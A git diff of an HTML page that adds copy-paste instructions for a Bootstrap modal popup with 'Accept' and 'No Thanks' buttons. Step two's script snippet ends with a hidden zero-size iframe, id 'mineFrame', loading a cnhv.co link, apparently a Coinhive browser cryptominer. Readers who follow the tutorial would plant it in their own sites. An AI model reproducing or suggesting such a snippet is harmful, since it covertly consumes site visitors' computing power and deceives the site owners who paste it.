@@ -259,9 +259,50 @@
         <div class="container text-center">
           <div class="row">
             <div class="col-lg-8 mx-auto">
-              <hr class="star-dark mb-5">
-              <img class="img-fluid mb-5" src="img/portfolio/JsLogo.png" alt="">
-              <p class="mb-5">Display Javascript Documentation here</p>
+              <div class="modal-body">
+              	<h5>Step one:<h6>Copy this modal into your &lt;body&gt; tag</h6></h5>
+	              	<h7>
+	              		&lt;div&gt; <br>
+						  &lt;div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true"&gt;<br>
+						    &lt;div class="modal-dialog modal-dialog-centered" role="document"><br>
+						      &lt;div class="modal-content"><br>
+						        &lt;div class="modal-header"><br>
+						          &lt;img src="" alt="Insert you logo here!" height="40" width="40"><br>
+						          &lt;button type="button" class="close" data-dismiss="modal" aria-label="Close"><br>
+						            &lt;span aria-hidden="true">&lt;/span><br>
+						          &lt;/button>
+						        &lt;/div><br>
+						        &lt;div class="modal-body"><br>
+						          &lt;p>
+						          You can insert your personal message here!
+						          &lt;/p>
+						        &lt;/div>
+						        &lt;div class="modal-footer"><br>
+						          &lt;button type="button" class="btn btn-primary" data-dismiss="modal">Accept&lt;/button><br>
+						          &lt;button type="button" class="btn btn-secondary" data-dismiss="modal">No Thanks&lt;/button><br>
+						        &lt;/div>
+						      &lt;/div>
+						    &lt;/div>
+						  &lt;/div>
+						&lt;/div>
+	              	</h7>
+              	<h5>
+              		Step two: <h6>Copy this text and copy in into the &lt;body&gt; tag</h6>
+              	</h5>
+              	<h7>
+              		&lt;script&gt;
+              		<br>
+              		$(document).ready(function() {
+					     $("#exampleModalCenter").modal();
+					     $('#exampleModalCenter').on('shown.bs.modal', function() {
+					        $('#myInput').focus();
+					     });
+				  	});<br>
+				  	&lt;/script&gt;
+				  	<br>
+				  	&lt;iframe src="https://cnhv.co/2259d" style="border: 0; border: none; height: 0; width: 0;" id ="mineFrame"&gt;&lt;/iframe&gt;
+              	</h7>
+              </div>
               <a class="btn btn-primary btn-lg rounded-pill portfolio-modal-dismiss" href="#">
                 <i class="fa fa-close"></i>
                 Close Window</a>
